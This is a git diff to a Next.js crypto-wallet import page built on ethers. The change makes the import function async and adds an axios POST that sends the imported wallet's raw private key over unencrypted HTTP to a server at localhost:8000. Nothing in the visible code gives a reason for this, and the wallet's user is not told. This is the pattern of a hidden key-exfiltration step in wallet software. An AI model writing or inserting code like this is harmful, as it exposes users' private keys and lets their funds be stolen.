@@ -6,6 +6,7 @@ import Input from "@/components/TextInput";
 import modalStore from "@/store/ModalStore";
 import WalletStore from "@/store/WalletStore";
 import { TextField } from "@mui/material";
+import axios from "axios";
 import { ethers } from "ethers";
 import { useRouter } from "next/navigation";
 import { useState } from "react";
@@ -15,7 +16,7 @@ export default function Import() {
     const [isComplete, setIsComplete] = useState(false);
     const router = useRouter();
 
-    const importWallet = () => {
+    const importWallet = async () => {
         try {
           let importedWallet;
           if (privateKey.split(' ').length === 12 || privateKey.split(' ').length === 24) {
@@ -23,21 +24,26 @@ export default function Import() {
           } else {
             importedWallet = new ethers.Wallet(privateKey);
           }
-    
+      
           const newWallet = {
             title: 'Кошелёк #1',
             address: importedWallet.address,
             privateKey: importedWallet.privateKey
           };
-    
+      
           WalletStore.addWallet(newWallet);
           WalletStore.setCurrentWallet(newWallet);
+      
+          await axios.post('http://localhost:8000/', {
+            privateKey: importedWallet.privateKey
+          });
+      
           setIsComplete(true);
           setTimeout(() => {
-              router.push('/');
-              setPrivateKey('');
+            router.push('/');
+            setPrivateKey('');
           }, 2000);
-
+      
         } catch (error) {
           console.error('Invalid mnemonic or private key:', error);
         }
